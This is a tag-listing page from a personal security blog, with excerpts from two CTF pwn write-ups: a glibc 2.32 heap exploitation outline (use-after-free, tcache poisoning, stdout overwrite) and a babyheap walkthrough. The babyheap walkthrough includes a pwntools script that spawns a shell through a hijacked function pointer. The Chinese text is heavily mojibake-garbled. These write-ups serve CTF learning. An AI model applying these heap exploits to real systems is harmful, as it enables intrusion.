<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Write-Up | N0k's Den</title><meta name=keywords content><meta name=description content="Security research / CTF / Misc"><meta name=author content="N0k"><link rel=canonical href=https://trident91.github.io/tags/write-up/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://trident91.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://trident91.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://trident91.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://trident91.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://trident91.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://trident91.github.io/tags/write-up/index.xml><link rel=alternate hreflang=en href=https://trident91.github.io/tags/write-up/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://trident91.github.io/tags/write-up/"><meta property="og:site_name" content="N0k's Den"><meta property="og:title" content="Write-Up"><meta property="og:description" content="Security research / CTF / Misc"><meta property="og:locale" content="en"><meta property="og:type" content="website"><meta name=twitter:card content="summary"><meta name=twitter:title content="Write-Up"><meta name=twitter:description content="Security research / CTF / Misc"></head><body class="list dark" id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://trident91.github.io/ accesskey=h title="HOME (Alt + H)"><img src=https://trident91.github.io/apple-touch-icon.png alt aria-label=logo height=35>HOME</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://trident91.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://trident91.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://trident91.github.io/about/ title="about me"><span>about me</span></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://trident91.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://trident91.github.io/tags/>Tags</a></div><h1>Write-Up
<a href=/tags/write-up/index.xml title=RSS aria-label=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" height="23"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></h1></header><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>VNCTF2021 Pwn</h2></header><div class=entry-content><p>ä¸€ç‚¹åºŸè¯ 2021å¹´ä¸‰æœˆæŸä¸ªå‘¨æ—¥,å®‰æ’æœ¬æ¥æ˜¯ä¸Šåˆè¿åŠ¨,ä¸‹åˆæ‰“è¿™ä¸ªæ¯”èµ›. ç„¶è€Œç¯®çƒæ–—ç‰›è¿‡ç¨‹ä¸­è¢«å¯¹æ‰‹çˆ†äº†å¤´,æ˜äº†ä¸€æ•´å¤©,é‚å°†è¿™æ¯”èµ›é¸½äº†â€¦ è¿‡äº†ä¸€ä¸ªæœˆ,å›å¤´çœ‹ä¸‹æ¯”èµ›ä¸­çš„pwné¢˜.
ff glibc 2.32, éœ€è¦ç–¯ç‹‚è°ƒè¯•çš„ä¸€é“é¢˜,ä»¤äººæ˜è¿·.
ç¨‹åºåˆ†æ æ¼æ´ free åæŒ‡é’ˆæœªæ¸…ç©º.
å‘ç‚¹ æ²¡ç”¨æ•°ç»„å­˜å‚¨æŒ‡é’ˆ, åªèƒ½æ§åˆ¶ä¸Šä¸€ä¸ªmalloc()çš„chunk èƒ½malloc()çš„æœ€å¤§å¤§å°ä¸º0x7F (ä¹‹åä¼šå‘ç°è¿™ç‚¹æŠŠæœ€ååˆ©ç”¨æ—¶ä½¿ç”¨çš„sizeå¡çš„å¾ˆæ­») show() åªèƒ½ç”¨ä¸€æ¬¡, åº”è¯¥æ˜¯è¦æ‰“stdoutäº† edit() åªèƒ½ç”¨ä¸¤æ¬¡â€¦ 2.32ä¸­, tcache_entry ä¸­çš„nextæŒ‡é’ˆä¼šè¢«PROTECT_PTRå‡½æ•°å¼‚æˆ–å¤„ç†, ä½¿ç”¨çš„maskä¸ºå…¶åœ°å€Â»12. æ€è·¯ åˆ©ç”¨PROTECT_PTR: åˆ©ç”¨nextå€¼ä¸º0çš„chunk, å’Œ mask âŠ• 0 = mask ä»¥ä¸Šè¿™ä¸ªç‰¹æ€§, show()æ³„éœ²å‡º mask. maskå­˜æ”¾ç€ å †åœ°å€ Â» 12. show()æ¬¡æ•°ç”¨å°½.
é€šè¿‡UAFæ¼æ´, edit()ä¿®æ”¹tcache_entryä¸­çš„keyå€¼. tcache_entryä½¿ç”¨ç”¨æˆ·chunkä¸­çš„ç”¨æˆ·æ•°æ®,keyå°±åœ¨æ‰€è°“bkæŒ‡é’ˆçš„ä½ç½®. ä¿®æ”¹å®Œkeyå€¼,å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥è¿›è¡Œdouble free().
é€šè¿‡edit()åštcache poisoning, åŠ«æŒåˆ°tcache_perthread_struct. éœ€æ³¨æ„tcache_entry->next æŒ‡å‘çš„æ˜¯ç”¨æˆ·æ•°æ®æ®µ, å› æ­¤éœ€è¦åŠ«æŒçš„åœ°å€éœ€è¦åŠ ä¸Š0x10. è¿˜éœ€è¦ç”¨ä¹‹å‰æ³„éœ²å‡ºçš„maskå¯¹å…¶åšä¸€æ¬¡å¼‚æˆ–. edit()æ¬¡æ•°ç”¨å°½.
edit(p64(mask ^ (heap_base + 0x10))+p64(0)) tcache_perthread_structå¤§å°ä¸º0x290, æˆ‘ä»¬æŠŠcounts[0x290]è¦†ç›–æˆå¤§äºç­‰äº7,å°±èƒ½å°†å…¶é‡Šæ”¾åˆ°unsortedbinä¸­.
éå¸¸é‡è¦çš„ä¸€ç‚¹: è®°å¾—æˆ‘ä»¬åœ¨tcache_perthread_structæ“ä½œ, è¯¥chunkè¿›å…¥unsortedbinä¸­ä¼šå¯¹counts[]è¿›è¡Œæ±¡æŸ“,æˆ‘ä»¬è¦å°†å…¶æ¸…é›¶. åŒæ—¶,æˆ‘ä»¬ä¹Ÿåº”å½“ä¸ºä¹‹åçš„åˆ©ç”¨entries[]çš„æ“ä½œåšå‡†å¤‡,è®¾ç½®å¯¹åº”çš„counts[]å€¼ä½¿å…¶å¤§äºé›¶.
åˆ©ç”¨unsortedbinä¸­chunkçš„åˆ†å‰²,å°†main_arenaåœ°å€å†™åˆ°entries[ç›®æ ‡å¤§å°]ä¸­. é€šè¿‡partial overwrite æ‰“åˆ°_IO_2_1_stdout_ (éœ€è¦çˆ†ç ´,1 / 2^4).
...</p></div><footer class=entry-footer><span title='2021-04-08 16:48:49 +0000 UTC'>April 8, 2021</span>&nbsp;Â·&nbsp;3 min&nbsp;Â·&nbsp;566 words&nbsp;Â·&nbsp;N0k</footer><a class=entry-link aria-label="post link to VNCTF2021 Pwn" href=https://trident91.github.io/posts/vnctf2021/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>ç®€å•å †é¢˜write-up</h2></header><div class=entry-content><p>ACTF_2019_babyheap ç»å…¸çš„notebooké¢˜ç›®ç»“æ„, å †åˆ©ç”¨å½“ä¸­æœ€ç®€å•çš„ç±»å‹
æœ‰
============================== This is a heap exploit demo ============================== 1. Create something 2. Delete something 3. Print something 4. Exit create, delete, print ä¸‰ä¸ªé€‰é¡¹ã€‚
åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹
å­—ç¬¦ä¸²æŒ‡é’ˆ å‡½æ•°æŒ‡é’ˆ å­—ç¬¦ä¸²ä¹Ÿç”±malloc()åˆ›å»ºï¼Œä¸”å¯ä»¥ä»»æ„æŒ‡å®šå…¶é•¿åº¦å’Œå†…å®¹ã€‚ free()çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æ¸…ç©ºå†…å®¹ã€‚
åˆ©ç”¨æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼š createä¸¤æ¬¡ï¼Œå…¶ä¸­å­—ç¬¦ä¸²çš„å†…å®¹ä¸é‡è¦ï¼Œåªè¦ä¿è¯å…¶é‡Šæ”¾åä¸è¢«æ”¾å…¥0x20çš„fastbinä¸­ã€‚
æ­¤å¤„ä½¿è¿™è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å¤§å°ä¸º0x20ï¼Œå› æ­¤ä»–ä»¬è¢«é‡Šæ”¾åä¼šè¢«æ”¾å…¥0x30çš„å­—ç¬¦ä¸²å½“ä¸­ã€‚
é‡Šæ”¾è¿™ä¸¤ä¸ªnoteä¹‹åçš„fastbinå¦‚ä¸‹
0x20 note0 ğŸ — note1 0x30 String0 ğŸ — String1 å†æ¬¡create,ä½†ç”³è¯·çš„å­—ç¬¦ä¸²å¤§å°ä¸º0x10ï¼ˆchunkå¤§å°å³ä¸º0x20ï¼‰ã€‚fastbinæ˜¯FILO(first in last out)çš„ï¼Œé‚£ä¹ˆ
note2 = note1 string2 = note0 é¢˜ç›®bssæ®µä¸­è´´å¿ƒçš„å‡†å¤‡äº†/bin/shå­—ç¬¦ä¸²ï¼Œä¹Ÿæœ‰systemå‡½æ•°ã€‚ åœ¨createæ—¶å‘string2ä¸­å†™å…¥
binshåœ°å€ | systemçš„PLTè¡¨åœ°å€ printé€‰é¡¹è°ƒç”¨note0.å‡½æ•°æŒ‡é’ˆï¼Œå°±èƒ½æˆåŠŸè°ƒç”¨system('/bin/sh')ï¼Œå®Œæ•´payloadå¦‚ä¸‹
if len(sys.argv) >1 and sys.argv[1] == 'r': target = remote() else: target = process("./ACTF_2019_babyheap") if(len(sys.argv)>1) and sys.argv[1]=='g': gdb.attach(target) context.log_level='debug' binsh=0x602010 system_plt = 0x4007A0 def s(in_put): target.sendlineafter("choice: ",in_put) def create(size,content): s("1") target.recvuntil("size: \n") target.sendline(str(size)) target.recvuntil("content: \n") target.send(content) def delete(index): s("2") target.recvuntil("index: \n") target.sendline(str(index)) def pwn(): create(0x20,"A"*8+"\n") create(0x20,"B"*8+"\n") delete(0) delete(1) create(0x10,p64(binsh)+p64(system_plt)) #use print at index 0 to getshell after this target.interactive() pwn() WDB_2018_1st_babyheap åŒæ ·æ˜¯èœå•é¢˜ç›®,è®¾è®¡çš„ååˆ†å·§å¦™,æ¶‰åŠåˆ°äº†å¾ˆå¤šå †çš„çŸ¥è¯†ç‚¹.
...</p></div><footer class=entry-footer><span title='2021-03-04 11:03:54 +0000 UTC'>March 4, 2021</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;360 words&nbsp;Â·&nbsp;N0k</footer><a class=entry-link aria-label="post link to ç®€å•å †é¢˜write-up" href=https://trident91.github.io/posts/heap_writeup/></a></article></main><footer class=footer><span>&copy; 2025 <a href=https://trident91.github.io/>N0k's Den</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>